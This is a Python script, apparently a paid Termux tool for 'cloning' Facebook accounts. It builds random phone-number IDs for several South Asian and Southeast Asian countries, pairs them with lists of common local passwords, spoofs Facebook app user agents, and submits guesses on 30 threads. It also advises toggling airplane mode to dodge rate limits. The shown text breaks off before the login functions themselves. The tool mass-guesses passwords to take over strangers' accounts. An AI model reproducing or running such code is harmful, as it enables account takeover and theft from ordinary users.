#__________________[ IMPORT ]__________________#
import os,zlib
from os import system as osRUB
from os import system as cmd
os.system('clear')
print(f'\x1b[38;5;46m[\x1b[1;97m✓\x1b[38;5;46m] LOADING MODULES ')
try:
    import requests 
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m✓\x1b[38;5;46m] INSTALLING REQUESTS ')
    os.system('pip install requests')
try:
    import concurrent.futures
except ImportError:
    print(f'\x1b[38;5;46m[\x1b[1;97m✓\x1b[38;5;46m] INSTALLING FUTURES ')
    os.system('pip install futures')
try:
    import mechanize
except ModuleNotFoundError:
    os.system('pip install mechanize > /dev/null')
from urllib.request import Request, urlopen
import os, requests, re,platform, sys, random, subprocess, threading, itertools,base64,uuid,zlib,re,json,uuid,subprocess,shutil,webbrowser,time,json,sys,random,datetime,time,re,subprocess,platform,string,json,time,re,random,sys,string,uuid
from concurrent.futures import ThreadPoolExecutor as Habib
from string import * 
from random import randint
from time import sleep as slp
from os import system as cmd
from zlib import decompress 
import os, platform
from concurrent.futures import ThreadPoolExecutor
fast_work = ThreadPoolExecutor(max_workers=15).submit

xiaomii= random.choice(["Mi 10",
"MT6765 G Series",
"Note 12 Pro",
"Pocophone F1",
"Qin 1s+",
"Qin 2",
"Qin 2 Pro",
"Redmi 01A",
"Redmi 1",
"Redmi 10",
"Redmi 10 (2022)",
"Redmi 10 5G",
"Redmi 10 Prime",
"Redmi 10 Prime (2022)",
"Redmi 10 Prime+ 5G",
"Redmi 10A",
"Redmi 10C",
"Redmi 10I",
"Redmi 10S",
"Redmi 10X",
"Redmi 10X Pro",
"Redmi 11",
"Redmi 11 Prime",
"Redmi 11X",
"Redmi 12",
"Redmi 12C",
"Redmi 1S",
"Redmi 2",
"Redmi 2A",
"Redmi 3",
"Redmi 3S",
"Redmi 3X",
"Redmi 4",
"Redmi 4 Prime",
"Redmi 4 Pro",
"Redmi 41224",
"Redmi 4A",
"Redmi 4X",
"Redmi 5",
"Redmi 5 Plus",
"Redmi 5 Pro",
"Redmi 5A",
"Redmi 5pro",
"Redmi 5S",
"Redmi 6",
"Redmi 6 Pro",
"Redmi 6 Pro Extreme",
"Redmi 6A",
"Redmi 7",
"Redmi 7 Pro",
"Redmi 7A",
"Redmi 7i",
"Redmi 8",
"Redmi 85781",
"Redmi 8A",
"Redmi 8A Dual",
"Redmi 8A Pro",
"Redmi 9",
"Redmi 9 Power",
"Redmi 9 Prime",
"Redmi 9 Pro",
"Redmi 99070",
"Redmi 9A",
"Redmi 9AT",
"Redmi 9C",
"Redmi 9C NFC",
"Redmi 9I",
"Redmi 9Prime",
"Redmi 9pro",
"Redmi 9T",
"Redmi 9T NFC",
"Redmi A1",
"Redmi A1+",
"Redmi A2",
"Redmi A2+",
"Redmi A3",
"Redmi A8",
"Redmi A90",
"Redmi G25",
"Redmi Go",
"Redmi K20",
"Redmi K20 Pro",
"Redmi K20 Pro Premium Edition",
"Redmi K30",
"Redmi K30 5G",
"Redmi K30 Pro",
"Redmi K30 Pro Zoom Edition",
"Redmi K30 Ultra",
"Redmi K30i 5G",
"Redmi K30S Ultra",
"Redmi K40",
"Redmi K40 Gaming",
"Redmi K40 Pro",
"Redmi K40S",
"Redmi K50",
"Redmi K50 Pro",
"Redmi K50G",
"Redmi K50i",
"Redmi K60",
"Redmi K60 Pro",
"Redmi note",
"Redmi Note 1",
"Redmi Note 10",
"Redmi Note 10 5G",
"Redmi Note 10 JE",
"Redmi Note 10 Lite",
"Redmi Note 10 Pro",
"Redmi Note 10 Pro Max",
"Redmi Note 10S",
"Redmi Note 10T",
"Redmi Note 10T 5G",
"Redmi Note 10X",
"Redmi Note 11",
"Redmi Note 11 4G",
"Redmi Note 11 5G",
"Redmi Note 11 Pro",
"Redmi Note 11 Pro 5G",
"Redmi Note 11 Pro+",
"Redmi Note 11 Pro+ 5G",
"Redmi Note 11 SE",
"Redmi Note 11E",
"Redmi Note 11E Pro",
"Redmi Note 11R",
"Redmi Note 11R 5G",
"Redmi Note 11S",
"Redmi Note 11S 5G",
"Redmi Note 11T 5G",
"Redmi Note 11T Pro",
"Redmi Note 11T Pro+",
"Redmi Note 12",
"Redmi Note 12 Discovery",
"Redmi Note 12 Pro",
"Redmi Note 12 Pro DE",
"Redmi Note 12 Pro+",
"Redmi Note 12 Pro+ 5G",
"Redmi Note 12S",
"Redmi Note 12T",
"Redmi Note 13",
"Redmi Note 15 Pro",
"Redmi Note 16 Pro",
"Redmi Note 1LTE",
"Redmi Note 2",
"Redmi Note 27",
"Redmi Note 3",
"Redmi Note 3 Pro",
"Redmi Note 4",
"Redmi Note 4 Pro",
"Redmi Note 4A",
"Redmi Note 4G",
"Redmi Note 4X",
"Redmi Note 5",
"Redmi Note 5 Pro",
"Redmi Note 5A",
"Redmi Note 5A Lite",
"Redmi Note 5A Prime",
"Redmi Note 6",
"Redmi Note 6 Pro",
"Redmi Note 6Pro",
"Redmi Note 7",
"Redmi Note 7 Pro",
"Redmi Note 7S",
"Redmi Note 8",
"Redmi Note 8 (2021)",
"Redmi Note 8 Pro",
"Redmi Note 8T",
"Redmi Note 9",
"Redmi Note 9 5G",
"Redmi Note 9 Pro",
"Redmi Note 9 Pro 5G",
"Redmi Note 9 Pro Max",
"Redmi Note 9S",
"Redmi Note 9T",
"Redmi Note 9T 5G",
"Redmi Note Prime",
"Redmi Note10",
"Redmi Note10T",
"Redmi Note7",
"Redmi Note8",
"Redmi Note8T",
"Redmi Note9",
"Redmi Pad",
"Redmi Pro",
"Redmi S2",
"Redmi X",
"Redmi Y1",
"Redmi Y1 Lite",
"Redmi Y2",
"Redmi Y3"])
#______________________[ UPDATE SYSTEM ]______________________________#

#__________________[ FILE M1 UPDATE SYSTEM ]__________________#
def random1():
    facebook_version = f'{random.randint(60,437)}.0.0.{random.randint(1,99)}.{random.randint(70,200)}'
    fbbv = str(random.randint(10000000, 99999999))
    fbsv = f"{random.uniform(4.0, 10.0):.1f}"
    density = random.choice(["1.0","1.75","2.0","2.25","2.75","3.0","3.25","3 75"])
    width = random.choice(["720", "1080"])
    height = random.randint(1280, 2560)
    fblc = random.choice(["ja_JP","ex_MX","en_CU","en_US","fr_FR","fa_IR","es_ES","pt_BR","de_DE","it_IT","ja_JP","ko_KR","ru_RU","zh_CN","ar_AE","en_GB"])
    fbcr = random.choice(["Telenor","fido","MOVO AFRICA","UFONE-PAKTel","Zong","Jazz","SCO","Jio","Vodafone","Airtel","BSNL","MTNL","Grameenphone","Robi","Banglalink","Teletalk","Telkomsel","Indosat Ooredoo","Axiata","Tri","Smartfren","China Mobile","Unicom","Telecom","Satcom","Docomo","Rakuten","IIJmio","Orange","Verizon","AT&T","T-Mobile","Sprint","Vodafone","Telefonica","EE","Orange","Three"])
    fban = random.choice(["FB4A", "FB5A", "FB6A"])
    fbpn = random.choice(["com.facebook.katana", "com.facebook.orca","messenger-android", "com.facebook.lite"])
    ua = f"[FBAN/FB4A;FBAV/{facebook_version};FBBV/{fbbv};[FBAN/FB4A;FBAV/{facebook_version};FBLC/km_KH;FBBV/{fbbv};FBCR/Metfone;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/{xiaomii};FBSV/9.2.1;FBCA/armeabi-v7a:armeabi;FBDM/"+"{"+f"density={density},width={width},height={height}]"
    return ua                                 
    
#__________________[ FILE M2 UPDATE SYSTEM ]__________________#
model=random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
def file2():
    vchrome = str(random.randint(100,925))+".0.0."+str(random.randint(1,8))+"."+str(random.randint(40,150))
    VAPP = random.randint(410000000,499999999)
    ua = 'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/N2G48H) [FBAN/FB4A;FBAV/382.0.0.33.111;FBPN/com.facebook.katana;FBLC/zh_CN;FBBV/394408512;FBCR/EE;FBMF/Asus;FBBD/Asus;FBDV/ASUS_Z01QD;FBSV/7.1.2;FBCA/x86:armeabi-v7a;FBDM/{density=1.5,width=800,height=1280};FB_FW/1;FBRV/0;]'
    return ua
 
#__________________[ FILE M3 UPDATE SYSTEM ]__________________#   
def file3():
    ua = 'Dalvik/2.1.0 (Linux; U; Android 12; vivo 1920 Build/SP1A.210812.003) [FBAN/Orca-Android;FBAV/439.0.0.29.119;FBPN/com.facebook.orca;FBLC/en_US;FBBV/548243065;FBCR/No service;FBMF/vivo;FBBD/vivo;FBDV/vivo 1920;FBSV/12;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2141};FB_FW/1;]'
    return ua
    
#__________________[ RANDOM M1 UPDATE SYSTEM ]__________________#

def random1():
    ua = 'Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]'
    return ua
#__________________[ RANDOM M2 UPDATE SYSTEM ]__________________#

def random2():
    ua = 'Dalvik/2.1.0 (Linux; U; Android 13; SM-F936B Build/TP1A.220624.014) [FBAN/Orca-Android;FBAV/440.0.0.30.352;FBPN/com.facebook.orca;FBLC/en_AU;FBBV/554361140;FBCR/null;FBMF/samsung;FBBD/samsung;FBDV/SM-F936B;FBSV/13;FBCA/arm64-v8a:null;FBDM/{density=2.625,width=904,height=2103};FB_FW/1;]'
    return ua
    
#__________________[ RANDOM M3 UPDATE SYSTEM ]__________________#      

def random3():
    ua = 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9305 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FBAN/EMA;FBLC/ru_RU;FBAV/228.0.0.7.119;FBDM/DisplayMetrics{density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=304.8, ydpi=306.716};]'
    return ua
    
    
#__________________[ RANDOM M4 UPDATE SYSTEM ]__________________#  
def random4():
    ua = 'Mozilla/5.0 (Linux; U; Android 4.3; ru-ru; GT-I9305 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 [FBAN/EMA;FBLC/ru_RU;FBAV/228.0.0.7.119;FBDM/DisplayMetrics{density=2.0, width=720, height=1280, scaledDensity=2.0, xdpi=304.8, ydpi=306.716};]'
    return ua



#__________________[ LOOP ]__________________#

totaldmp = 0
count = 0
loop = 0
oks = []
cps = []
id = []
ps = []
sid = []
total=[]
methods = []
srange = 0
saved = []
totaldmp = 0
filter = []
loop,ok,cp,user = 0,[],[],[]
cok,plist = [],[]

myid = uuid.uuid4().hex[:40].upper()
idmy = uuid.uuid4().hex[:6].upper()
try:
    generate = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()
except:
    getx = open('/data/data/com.termux/files/usr/lib/.myawm.txt','w')
    getx.write(myid+idmy)
    getx.close()
MY_KEY = open('/data/data/com.termux/files/usr/lib/.myawm.txt','r').read()

SEX= f"{random.choice(['Liger','METERED','MOBILE.EDGE' ,'MOBILE.HSPA','MOBILE.LTE','MODERATE'])}"
voda=requests.get('https://raw.githubusercontent.com/ARNAV-444/testing/main/pro.txt').text.splitlines()
xxxx=requests.get('https://raw.githubusercontent.com/ARNAV-444/testing/main/pro.txt').text.splitlines()
videop=requests.get('https://raw.githubusercontent.com/ARNAV-444/testing/main/pro.txt').text.splitlines()
filenm=requests.get('https://raw.githubusercontent.com/ARNAV-444/testing/main/pro.txt').text.splitlines()
#__________________[ SYS ]__________________#
sys.stdout.write('\x1b]2; ARNAV\x07')
head = {'Host': 'adsmanager.facebook.com', 'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"', 'viewport-width': '980'}
#__________________[ COLOUR ]__________________#
A = '\x1b[1;97m';R = '\x1b[38;5;196m';Y = '\033[1;33m';G = '\x1b[38;5;48m';B = '\x1b[38;5;8m';G1 = '\x1b[38;5;46m';G2 = '\x1b[38;5;47m';G3 = '\x1b[38;5;48m';G4 = '\x1b[38;5;49m';G5 = '\x1b[38;5;50m';X = '\33[1;34m';X1 = '\x1b[38;5;14m';X2 = '\x1b[38;5;123m';X3 = '\x1b[38;5;122m';X4 = '\x1b[38;5;86m';X5 = '\x1b[38;5;121m';S = '\x1b[1;96m';M = '\x1b[38;5;205m'
#__________________[ LINEX ]__________________#
def clear():os.system('clear');print(logo)
def linex():print(f'{G}──────────────────────────────────────────────────')
#__________________[ LOGO ]__________________#
logo =f"""
\033[1;37m
.88b  d88. d8888b.     .d8b.  d8888b. d8b   db  .d8b.  db    db 
88'YbdP`88 88  `8D    d8' `8b 88  `8D 888o  88 d8' `8b 88    88 
88  88  88 88oobY'    88ooo88 88oobY' 88V8o 88 88ooo88 Y8    8P 
88  88  88 88`8b      88~~~88 88`8b   88 V8o88 88~~~88 `8b  d8' 
88  88  88 88 `88. db 88   88 88 `88. 88  V888 88   88  `8bd8'  
YP  YP  YP 88   YD VP YP   YP 88   YD VP   V8P YP   YP    YP    
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 Author    : ARNAV
 Github    : Micky
 Facebook  : ARNAV CHAULAGAI
 Tool Name : ARNAV
 Tool Type : \033[1;31mFILE\033[1;37m
 Version   : \033[1;33m3.4\033[1;37m
\x1b[1;92m──────────────────────────────────────────────────
\033[1;32m[\033[1;31m✓\033[1;32m] Your_Key : {MY_KEY}
\x1b[1;92m──────────────────────────────────────────────────"""


def clear():
	os.system('clear')
	print(logo)
	
class apvroval:
    def check():
        url = "https://github.com/ARN9VH3R3/Impulse/blob/main/Approval.txt"
        import mechanize
        my_awm = mechanize.Browser()
        try:
            host = my_awm.open(url)
            check_key = str(host.read())
            if MY_KEY in check_key:
                menu()
            else:
                clear()
                print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THIS TOOL IS PAID.SO,YOU NEED PERMISSION TO USE THIS TOOL')
                print('\033[1;32m[\033[1;31m✓\033[1;32m] SEND YOUR KEY TO GET APPROVAL');linex()
                os.system( 'xdg-open https://wa.me/+9779742524177')
        except Exception as e:
            print(e)
            exit()
#__________________[ RESULT ]__________________#
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        print(f'\r{G}──────────────────────────────────────────────────')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETE...')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK {G}:{G2} %s' % str(len(oks)))
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP {G}:{G3} %s' % str(len(cps)))
        print(f'\r{G}──────────────────────────────────────────────────')
        input(f"\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK MENU ")
        exit()
        

#__________________[ MENU ]__________________#
def menu():   
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] FILE CLONING')
    print(f'\033[1;32m[\033[1;31m2\033[1;32m] RANDOM CLONING')
    print(f'\033[1;32m[\033[1;31m3\033[1;32m] CONTACT TOOL OWNER')
    print(f'\033[1;32m[\033[1;31m4\033[1;32m] OWNER FACEBOOK ID')
    print(f'\033[1;32m[\033[1;31m0\033[1;32m] EXIT TOOLS')
    linex()
    select = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE {G}:{G5} ')
    if select =='1':
        _file_()
    elif select =='2':
        _randm_()
    elif select =='3':
        os.system('xdg-open https://wa.me/+9779742524177');menu()
    elif select =='4':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100057497148585');menu()
    elif select =='0':
        exit(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXIT DONE ')
    else:
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] VALID OPTION')
        time.sleep(2)
        menu()
#__________________[ RANDOM ]__________________#      
def _randm_():   
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] BANGLADESH CLONING')
    print(f'\033[1;32m[\033[1;31m2\033[1;32m] NEPAL CLONING')
    print(f'\033[1;32m[\033[1;31m3\033[1;32m] INDIAN CLONING')
    print(f'\033[1;32m[\033[1;31m4\033[1;32m] PAKISTAN CLONING')
    print(f'\033[1;32m[\033[1;31m5\033[1;32m] MALAYSIA CLONING')
    print(f'\033[1;32m[\033[1;31m6\033[1;32m] AFGHANISTAN CLONING')
    print(f'\033[1;32m[\033[1;31m0\033[1;32m] BACK TO MAIN MENU')
    linex()
    select = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE {G}:{G5} ')
    if select =='1':
        _bd_()
    elif select =='2':
        _Nepal_()
    elif select =='3':
        _India_()
    elif select =='4':
        _Pk_()
    elif select =='5':
        _Malaysia_()
    elif select =='6':
        _Afg_()
    elif select =='0':
    	menu()
    else:
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] VALID OPTION')
        time.sleep(2)
        _randm_()
#__________________[ BANGLADESH ]__________________#
def _bd_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} 017{G}/{G1}019{G}/{G1}018{G}/{G1}016');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    name = ''.join(random.choice(string.digits) for _ in range(2))
    cod = ''.join(random.choice(string.digits) for _ in range(2))
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD \033[1;32m[\033[1;31mM1\033[1;32m] \n\033[1;32m[\033[1;31m2\033[1;32m] METHOD \033[1;32m[\033[1;31mM2\033[1;32m] \n\033[1;32m[\033[1;31m3\033[1;32m] METHOD \033[1;32m[\033[1;31mM3\033[1;32m] \n\033[1;32m[\033[1;31m4\033[1;32m] METHOD \033[1;32m[\033[1;31mM4\033[1;32m] ');linex()
    mthd = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  : ')
    for x in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE  {G}:{G1} {code}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL UID {G}:{G2} {str(len(user))}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN');linex()
        for love in user:
            ids = code+name+cod+love
            psd = [code+name+cod+love,cod+love,name+love,code+name+cod,'bangladesh','Bangladesh']
            if mthd =='1':
            	sexy.submit(randm,ids,psd)
            if mthd =='2':
                sexy.submit(randm1,ids,psd)
            if mthd =='3':
                sexy.submit(randm2,ids,psd)
            if mthd =='4':
                sexy.submit(randm3,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID {G}:{G2} {str(len(ok))}')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID {G}:{G3} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
    menu()
#__________________[ NEPAL ]__________________#
def _Nepal_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} 9823{G}/{G1}9818{G}/{G1}9810{G}/{G1}9742 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD \033[1;32m[\033[1;31mM1\033[1;32m] \n\033[1;32m[\033[1;31m2\033[1;32m] METHOD \033[1;32m[\033[1;31mM2\033[1;32m] \n\033[1;32m[\033[1;31m3\033[1;32m] METHOD \033[1;32m[\033[1;31mM3\033[1;32m] \n\033[1;32m[\033[1;31m4\033[1;32m] METHOD \033[1;32m[\033[1;31mM4\033[1;32m] ');linex()
    mthd = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  : ')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(6))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE  {G}:{G1} {code}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL UID {G}:{G2} {str(len(user))}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [code+love,ids[:6],'kathmandu','nepal123','magar','magar123','tamang','tamang123','pokhara','maya','maya123','pokhara123','kathmandu123','newar123','kumari','kumari123']
            if mthd =='1':
            	sexy.submit(randm,ids,psd)
            if mthd =='2':
                sexy.submit(randm1,ids,psd)
            if mthd =='3':
                sexy.submit(randm2,ids,psd)
            if mthd =='4':
                sexy.submit(randm3,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID {G}:{G2} {str(len(ok))}')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID {G}:{G3} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
    menu()

#__________________[ INDIA ]__________________#         
def _India_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} +91639{G}/{G1}+91934{G}/{G1}+91901{G}/{G1}+91914 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD \033[1;32m[\033[1;31mM1\033[1;32m] \n\033[1;32m[\033[1;31m2\033[1;32m] METHOD \033[1;32m[\033[1;31mM2\033[1;32m] \n\033[1;32m[\033[1;31m3\033[1;32m] METHOD \033[1;32m[\033[1;31mM3\033[1;32m] \n\033[1;32m[\033[1;31m4\033[1;32m] METHOD \033[1;32m[\033[1;31mM4\033[1;32m] ');linex()
    mthd = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  : ')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE  {G}:{G1} {code}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL UID {G}:{G2} {str(len(user))}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [love,ids[:8],'57273200','59039200','57575751']
            if mthd =='1':
            	sexy.submit(randm,ids,psd)
            if mthd =='2':
                sexy.submit(randm1,ids,psd)
            if mthd =='3':
                sexy.submit(randm2,ids,psd)
            if mthd =='4':
                sexy.submit(randm3,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID {G}:{G2} {str(len(ok))}')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID {G}:{G3} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
    menu()


#__________________[ PAKISTAN ]__________________#        

def _Pk_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} 0300{G}/{G1}0303{G}/{G1}0302{G}/{G1}0306 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD \033[1;32m[\033[1;31mM1\033[1;32m] \n\033[1;32m[\033[1;31m2\033[1;32m] METHOD \033[1;32m[\033[1;31mM2\033[1;32m] \n\033[1;32m[\033[1;31m3\033[1;32m] METHOD \033[1;32m[\033[1;31mM3\033[1;32m] \n\033[1;32m[\033[1;31m4\033[1;32m] METHOD \033[1;32m[\033[1;31mM4\033[1;32m] ');linex()
    mthd = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  : ')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE  {G}:{G1} {code}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL UID {G}:{G2} {str(len(user))}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [love,ids,'khankhan','khan1122','ali12345','khanbaba','pakistan','khan12345','ali1122','khankhan12345','khan','baloch','pubg','pubg1122']
            if mthd =='1':
            	sexy.submit(randm,ids,psd)
            if mthd =='2':
                sexy.submit(randm1,ids,psd)
            if mthd =='3':
                sexy.submit(randm2,ids,psd)
            if mthd =='4':
                sexy.submit(randm3,ids,psd)
    print('')
    print(f'\r{G}──────────────────────────────────────────────────')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] THE PROCESS HAS BEEN COMPLETED')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL OK ID {G}:{G2} {str(len(ok))}')
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL CP ID {G}:{G3} {str(len(cp))}')
    print(f'\r{G}──────────────────────────────────────────────────')
    input(f'\033[1;32m[\033[1;31m✓\033[1;32m] PRESS ENTER TO BACK ')
    menu()
    
#__________________[ MALAYSIA ]__________________#        

def _Malaysia_():
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G1} 011{G}/{G1}012{G}/{G1}013{G}/{G1}010 ');linex()
    code = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G2} ')
    clear()
    print(f'\033[1;32m[\033[1;31m✓\033[1;32m] EXAMPLE {G}:{G3} 3000{G}/{G3}5000{G}/{G3}10000{G}/{G3}99999');linex()
    limit = int(input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  {G}:{G4} '))
    clear()
    print(f'\033[1;32m[\033[1;31m1\033[1;32m] METHOD \033[1;32m[\033[1;31mM1\033[1;32m] \n\033[1;32m[\033[1;31m2\033[1;32m] METHOD \033[1;32m[\033[1;31mM2\033[1;32m] \n\033[1;32m[\033[1;31m3\033[1;32m] METHOD \033[1;32m[\033[1;31mM3\033[1;32m] \n\033[1;32m[\033[1;31m4\033[1;32m] METHOD \033[1;32m[\033[1;31mM4\033[1;32m] ');linex()
    mthd = input(f'\033[1;32m[\033[1;31m✓\033[1;32m] CHOICE  : ')
    for x in range(limit):
        nmp = "". join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    clear()
    with Habib(max_workers=30) as sexy:
        clear()
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] SIM CODE  {G}:{G1} {code}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TOTAL UID {G}:{G2} {str(len(user))}')
        print(f'\033[1;32m[\033[1;31m✓\033[1;32m] TURN {G3}[{R}ON{G}/{R}OFF{G3}]{G3} AIRPLANE MODE EVERY {R}5{G3} MIN');linex()
        for love in user:
            ids = code+love
            psd = [ids,love,ids[:8],ids[:7],ids[:6],'Malaysia','malaysia']
            if mthd =='1':
            	sexy.submit(randm,ids,psd)
